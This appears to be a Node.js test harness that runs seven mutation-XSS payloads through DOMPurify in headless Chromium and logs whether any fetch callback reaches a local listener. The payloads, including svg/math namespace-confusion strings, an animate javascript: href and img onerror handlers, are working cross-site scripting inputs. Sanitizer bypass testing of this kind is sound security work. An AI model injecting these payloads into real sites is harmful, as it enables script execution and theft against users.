const { chromium } = require('playwright');
const fs = require('fs'); const path = require('path'); const http = require('http');
const purifySrc = fs.readFileSync(path.join(__dirname,'node_modules','dompurify','dist','purify.min.js'),'utf8');
const APP = (b)=>`<!doctype html><html><body><div id="note"></div>
<script>${purifySrc}</script>
<script>window.__x=0;const c=DOMPurify.sanitize(${JSON.stringify(b)},{FORBID_TAGS:["style"],RETURN_DOM_FRAGMENT:true});document.getElementById("note").replaceChildren(c);</script>
</body></html>`;
const P = {
 a:'<svg><a><animate attributeName=href values="javascript:fetch(\'http://127.0.0.1:9999/x1\')"/><text x=20 y=20>click</text></a></svg>',
 b:'<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=fetch("http://127.0.0.1:9999/x2")>',
 c:'<svg></p><style><a id="</style><img src=1 onerror=fetch(\'http://127.0.0.1:9999/x3\')>">',
 d:'<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=fetch(\'http://127.0.0.1:9999/x4\')>">',
 e:'<xmp><img src=1 onerror=fetch("http://127.0.0.1:9999/x5")></xmp>',
 f:'<listing><img src=1 onerror=fetch("http://127.0.0.1:9999/x6")></listing>',
 g:'<img src=x onerror="fetch(`http://127.0.0.1:9999/x7`)">',
};
(async()=>{
 const hits=[]; const srv=http.createServer((q,s)=>{hits.push(q.url); if(q.url.startsWith('/page')){s.setHeader('Content-Type','text/html');s.end(APP(P[decodeURIComponent(q.url.split('=')[1])]));}else s.end('ok');});
 await new Promise(r=>srv.listen(9999,r));
 const br=await chromium.launch();
 for(const k of Object.keys(P)){const pg=await br.newPage();const bf=hits.length;
  await pg.goto('http://127.0.0.1:9999/page?p='+k,{waitUntil:'networkidle'}).catch(()=>{});
  await pg.waitForTimeout(400);
  const h=hits.slice(bf).filter(u=>u.startsWith('/x'));
  console.log(k, h.length?('XSS! '+JSON.stringify(h)):'blocked');
  await pg.close();}
 await br.close(); srv.close();
})();
